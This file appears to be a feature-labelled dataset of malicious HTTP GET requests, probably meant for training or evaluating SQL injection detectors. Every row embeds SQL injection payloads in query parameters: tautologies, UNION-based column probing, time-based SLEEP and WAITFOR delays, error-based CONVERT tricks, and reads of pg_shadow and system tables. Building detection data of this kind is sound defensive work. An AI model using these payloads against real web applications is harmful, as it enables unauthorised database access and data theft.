142,2,200,1812,55,8,22,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9#&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7 HTTP/1.1
97,2,200,7143,31,14,21,1,1,GET ?name=admin') or '1'='1'#&tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6 HTTP/1.1
60,2,200,6568,13,17,12,1,1,GET ?mail= benchmark(3200_SHA1(1)) '&pass= AND 1=1# HTTP/1.1
161,2,200,2449,46,9,21,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27#&pass='^' HTTP/1.1
96,2,200,2357,30,13,17,1,1,GET ?code=admin" --&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
203,2,200,4936,62,10,28,2,1,GET ?email=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2))))&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
69,2,200,4524,21,9,8,1,1,GET ?name=" or 1=1–&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
163,2,200,5982,47,22,20,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
48,2,200,3250,14,14,8,1,1,GET ?email= like '%'&phone= ORDER BY 6  HTTP/1.1
135,2,200,7050,53,11,29,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2--  HTTP/1.1
88,2,200,3434,21,11,11,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12-- &id=admin") or ("1"="1"# HTTP/1.1
96,2,200,6295,25,30,14,1,1,GET ?name= OR 3409=3409 AND ('pytW' LIKE 'pytW&tel=' GROUP BY columnnames having 1=1 -- HTTP/1.1
99,2,200,6098,30,13,18,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11-- &phone=" or "a"="a HTTP/1.1
89,2,200,6779,38,7,20,1,1,GET ?name= WHERE 1=1 AND 1=1#&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
113,2,200,4854,31,12,23,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13#&code=') or ('x')=('x HTTP/1.1
58,6,200,7565,12,16,15,1,1,GET ?email=admin") or "1"="1&pass='&&SLEEP(5)&&'1 HTTP/1.1
58,2,200,6377,14,17,13,1,1,GET ?email= ORDER BY 1# &phone=admin') or ('1'='1 HTTP/1.1
61,2,200,7376,23,10,11,1,1,GET ?mail= ORDER BY 23-- &pass=' AnD SLEEP(5) ANd '1 HTTP/1.1
140,2,200,6978,40,12,23,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18-- &code= AND 7300=7300 AND ('pKlZ'='pKlZ HTTP/1.1
73,2,200,4579,21,23,11,1,1,GET ?id= ORDER BY 9-- &pass=' GROUP BY columnnames having 1=1 -- HTTP/1.1
79,2,200,3747,29,21,17,1,1,GET ?code= # from wapiti&code=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- HTTP/1.1
198,2,200,5540,45,11,17,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30-- &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11--  HTTP/1.1
136,2,200,2429,54,7,21,1,1,GET ?tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14&name= WHERE 1=1 AND 1=1-- HTTP/1.1
183,2,200,1169,78,14,38,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75)))-- &pass=' or 1=1-- HTTP/1.1
81,2,200,4618,21,9,10,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12#&name=) or '1′='1– HTTP/1.1
34,2,200,2673,7,9,7,1,1,GET ?tel==&name=" or ""^" HTTP/1.1
49,2,200,4603,14,14,9,1,1,GET ?phone= ORDER BY 3 &id=pg_sleep(5)-- HTTP/1.1
49,2,200,4360,14,14,9,1,1,GET ?phone= ORDER BY 3 &id=pg_sleep(5)-- HTTP/1.1
40,3,200,4583,7,10,12,1,1,GET ?code=') or '1'='1&code="&" HTTP/1.1
64,2,200,5949,15,14,17,2,1,GET ?tel=admin') or '1'='1'/*&name= WHERE 1=1 AND 1=1-- HTTP/1.1
99,2,200,6868,49,8,16,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))-- &pass= ORDER BY 25  HTTP/1.1
188,2,200,6463,77,12,24,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88))) HTTP/1.1
53,2,200,4387,12,15,15,1,1,GET ?mail=SLEEP(5)="&pass=admin' or '1'='1'# HTTP/1.1
249,2,200,2258,113,7,49,1,1,GET ?name= ORDER BY 8# &tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))--  HTTP/1.1
160,2,200,6569,53,7,29,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6-- &tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19--  HTTP/1.1
92,2,200,3287,31,10,16,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7#&pass=' or 0=0 – HTTP/1.1
72,2,200,3828,7,34,13,2,1,GET ?code=" or 1=1&code=' and substring(password/text()_1_1)='7 HTTP/1.1
68,2,200,6739,24,8,17,1,1,GET ?id= AS INJECTX WHERE 1=1 AND 1=1&pass=') or ('1'='1'-- HTTP/1.1
254,2,200,6728,138,36,28,1,1,GET ?account= and (select substring(@@version_1_1))='M'&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
156,2,200,1816,45,10,14,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12# HTTP/1.1
163,2,200,6577,57,9,27,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &pass=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)# HTTP/1.1
156,2,200,4688,31,25,17,1,1,GET ?phone=select * from pg_shadow;&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24--  HTTP/1.1
380,2,200,1137,226,18,41,1,1,GET ?mail= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= AND (SELECT 4523 FROM(SELECT COUNT(*)_CONCAT(0x716a7a6a71_(SELECT (ELT(4523=4523_1)))_0x71706a6b71_FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) HTTP/1.1
78,2,200,2794,7,38,11,2,1,GET ?username=' group by userid having 1=1--&pass=admin" or "1"="1"/* HTTP/1.1
64,2,200,1215,7,22,20,1,1,GET ?email=")) or (("x"))=(("x&pass=') or pg_sleep(5)-- HTTP/1.1
334,2,200,5695,149,9,62,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
165,2,200,3558,74,9,31,1,1,GET ?tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))&name=" or ""*" HTTP/1.1
113,2,200,3502,30,9,19,1,1,GET ?id=admin" --&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
126,2,200,2904,37,4,15,1,1,GET ?id= ORDER BY 14 &id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
160,2,200,2520,45,7,17,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &id= UNION ALL SELECT 1_2_3_4_5_6_7--  HTTP/1.1
82,1,200,4706,42,7,13,2,1,GET login/?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))# HTTP/1.1
82,1,200,4514,42,7,13,2,1,GET login/?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))# HTTP/1.1
82,1,200,7642,42,7,13,2,1,GET login/?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))# HTTP/1.1
72,2,200,7530,24,18,11,1,1,GET ?phone= AS INJECTX WHERE 1=1 AND 1=0#&id=' or uname like '% HTTP/1.1
40,2,200,7225,7,8,8,1,1,GET ?id=" or 0=0 –&id=" or 1=1# HTTP/1.1
126,2,200,5276,31,14,17,1,1,GET ?tel=admin" or "1"="1"#&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
66,2,200,3388,7,25,12,1,1,GET ?id=waitfor delay '00:00:05'&pass=admin" or "1"="1"-- HTTP/1.1
289,2,200,1921,122,8,51,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14&code= AND 5650=CONVERT(INT_(SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) (SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113))) HTTP/1.1
136,2,200,7954,36,11,17,1,1,GET ?email=or SLEEP(5)="&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
121,2,200,5826,35,6,6,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10# HTTP/1.1
102,2,200,4912,31,18,16,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9-- &pass= # from wapiti HTTP/1.1
79,2,200,7801,21,15,16,1,1,GET ?mail=admin') or ('1'='1'#&pass= UNION ALL SELECT 1_2_3_4_5_6_7--  HTTP/1.1
57,2,200,3590,14,12,14,1,1,GET ?mail=")) or (("x"))=(("x&pass= ORDER BY 20  HTTP/1.1
89,2,200,4519,39,4,7,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12#&id= UNION ALL SELECT NULL# HTTP/1.1
133,2,200,6980,30,15,18,1,1,GET ?code=admin" or "1"="1"--&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
61,2,200,6157,22,12,12,1,1,GET ?name=-1 UNION SELECT 1 INTO @_@_@&tel=sleep(5)# HTTP/1.1
48,2,200,1671,7,14,17,1,1,GET ?username=') or ('1'='1'#&pass= '-' HTTP/1.1
172,2,200,5222,46,14,21,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26#&id=admin") or "1"="1"# HTTP/1.1
148,2,200,7230,47,24,16,1,1,GET ?account=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10 HTTP/1.1
107,2,200,4850,31,10,15,1,1,GET ?code=or 1=1&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
123,2,200,2809,32,19,24,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12-- &code=') or benchmark(10000000_MD5(1))# HTTP/1.1
94,1,200,2750,46,2,15,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
94,1,200,2277,46,2,15,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
199,2,200,2870,60,8,19,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
167,2,200,7572,32,36,23,1,1,GET ?account= and (select substring(@@version_3_1))='X'&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
133,2,200,7072,31,10,18,1,1,GET ?mail=' or 0=0 --&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
138,2,200,4208,64,10,26,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))&phone= OR 1=0# HTTP/1.1
34,1,200,4745,7,8,5,1,1,GET ?pass="or 1=1 or ""=" HTTP/1.1
34,1,200,6592,7,8,5,1,1,GET ?pass="or 1=1 or ""=" HTTP/1.1
159,2,200,5969,21,44,11,1,1,GET ?email=select current_setting('log_connections');&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
48,2,200,4983,15,6,8,1,1,GET ?id=" or ""-"&id= WHERE 1=1 AND 1=0 HTTP/1.1
175,2,200,6734,53,7,20,1,1,GET ?tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27&name=1' GROUP BY 1_2_3--  HTTP/1.1
132,2,200,7895,36,8,23,1,1,GET ?code= AND 1=1 AND '%'='&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
56,2,200,3328,14,11,10,2,1,GET ?name= ORDER BY 11# &phone=") or ("1"="1"/* HTTP/1.1
103,2,200,4908,21,24,9,1,1,GET ?username=waitfor delay '00:00:05'&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
47,2,200,3149,7,13,11,1,1,GET ?id=admin" or 1=1#&id=) or '1′='1– HTTP/1.1
82,2,200,7900,34,11,23,1,1,GET ?mail=') or ('1'='1'#&pass=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) HTTP/1.1
61,2,200,6896,14,19,13,1,1,GET ?email=') or pg_sleep(5)--&phone= ORDER BY 27--  HTTP/1.1
125,2,200,6541,54,12,27,1,1,GET ?email=%' or '0'='0&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))# HTTP/1.1
51,2,200,4957,20,9,8,1,1,GET ?name= ORDER BY 8# &phone= HAVING 1=0# HTTP/1.1
60,2,200,7891,14,16,11,1,1,GET ?id=waitfor delay '00:00:05'&id= ORDER BY 18--  HTTP/1.1
173,2,200,5679,47,26,16,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16&pass=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
87,2,200,7663,7,44,19,1,1,GET ?name=") or pg_sleep(5)--&phone= and (select substring(@@version_3_1))='c' HTTP/1.1
96,2,200,6858,31,16,20,1,1,GET ?phone=') or pg_sleep(5)--&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5# HTTP/1.1
75,2,200,1028,34,13,13,1,1,GET ?code=admin" #&code= UNION SELECT @@VERSION_SLEEP(5)_USER()_4# HTTP/1.1
176,2,200,2753,97,11,29,1,1,GET ?name=') or ('1'='1'--&phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
142,2,200,7061,37,8,15,1,1,GET ?mail= ORDER BY 10 &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
43,2,200,1569,7,12,15,1,1,GET ?code=' or ''^'&code=' or ''-' HTTP/1.1
278,2,200,6724,125,7,57,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))#&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8--  HTTP/1.1
67,2,200,4263,10,40,7,1,1,GET ?account=select name from sysibm.systables;&pass=AND 1 HTTP/1.1
74,2,200,1496,24,14,11,2,1,GET ?phone=admin") or "1"="1"/*&id= AS INJECTX WHERE 1=1 AND 1=0# HTTP/1.1
71,2,200,7023,19,17,20,1,1,GET ?email=';WAITFOR DELAY '0:0:30'--&phone=admin' or '1'='1'# HTTP/1.1
160,2,200,6968,31,18,15,1,1,GET ?username=" or true--&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29 HTTP/1.1
113,2,200,7438,38,9,18,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14#&phone= WHERE 1=1 AND 1=0 HTTP/1.1
213,2,200,5436,69,9,29,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
85,2,200,2296,21,9,9,1,1,GET ?tel=") or ("1"="1&name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
148,2,200,3327,21,45,11,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23#&name=select current_setting('password_encryption'); HTTP/1.1
60,2,200,2829,7,36,9,1,1,GET ?tel=select name from sysibm.systables;&name=== HTTP/1.1
94,2,200,3548,30,20,19,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4-- &pass=admin"or 1=1 or ""=" HTTP/1.1
194,2,200,1283,101,4,37,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))-- &id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
57,2,200,3507,13,11,17,1,1,GET ?name= HAVING 1=1-- &tel=")) or (("x"))=(("x HTTP/1.1
305,2,200,1430,137,11,29,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
58,2,200,3888,7,21,16,2,1,GET ?username= or 1=1/*&pass=admin') or ('1'='1'# HTTP/1.1
57,2,200,1466,7,20,14,1,1,GET ?id=' and 'one'='one&id=admin") or "1"="1"-- HTTP/1.1
128,2,200,7655,46,19,21,2,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11#&pass=admin' or 1=1/* HTTP/1.1
237,2,200,2857,97,7,41,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18#&name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80))) HTTP/1.1
66,2,200,6965,22,15,11,1,1,GET ?mail=admin" or 1=1--&pass=-1 UNION SELECT 1 INTO @_@ HTTP/1.1
99,2,200,4482,31,12,16,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9-- &phone=" or 1=1– HTTP/1.1
165,2,200,1138,69,10,23,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17#&phone= UNION SELECT @@VERSION_SLEEP(5)_"'3 HTTP/1.1
61,2,200,3985,19,15,15,1,1,GET ?code=ORDER BY SLEEP(5)#&code=admin') or ('1'='1 HTTP/1.1
115,2,200,3062,33,20,19,1,1,GET ?account=benchmark(50000000_MD5(1))&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8--  HTTP/1.1
40,2,200,6324,12,9,10,1,1,GET ?tel='\"&name=pg_SLEEP(5)-- HTTP/1.1
199,2,200,4244,92,9,33,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75))) HTTP/1.1
213,1,200,1511,145,4,17,1,1,GET ?code= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
91,2,200,6410,37,10,15,1,1,GET ?email= ORDER BY 23 &phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
53,2,200,1446,7,15,16,2,1,GET ?account=" or 1=1--&pass=') or '1'='1'/* HTTP/1.1
140,2,200,1872,46,14,27,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15&tel='=' 'or' and '=' 'or' HTTP/1.1
62,2,200,4104,14,18,15,1,1,GET ?account=admin') or '1'='1'#&pass= ORDER BY 18--  HTTP/1.1
199,2,200,5827,69,9,28,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
157,2,200,4997,65,11,26,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
133,2,200,7546,58,13,27,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))-- &pass='or'1=1′ HTTP/1.1
49,2,200,1758,7,12,16,1,1,GET ?mail=" or 1=1--&pass=') or '1'='1-- HTTP/1.1
55,2,200,7730,7,13,21,2,1,GET ?id=') or '1'='1'/*&id=admin') or '1'='1'# HTTP/1.1
50,2,200,4626,14,10,8,1,1,GET ?mail=" or 1=1 –&pass= ORDER BY 10--  HTTP/1.1
81,2,200,1632,30,11,22,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3#&name='or 1=1 or ''=' HTTP/1.1
46,2,200,2957,7,11,15,2,1,GET ?name=') or ('1'='1'/*&phone=1*56 HTTP/1.1
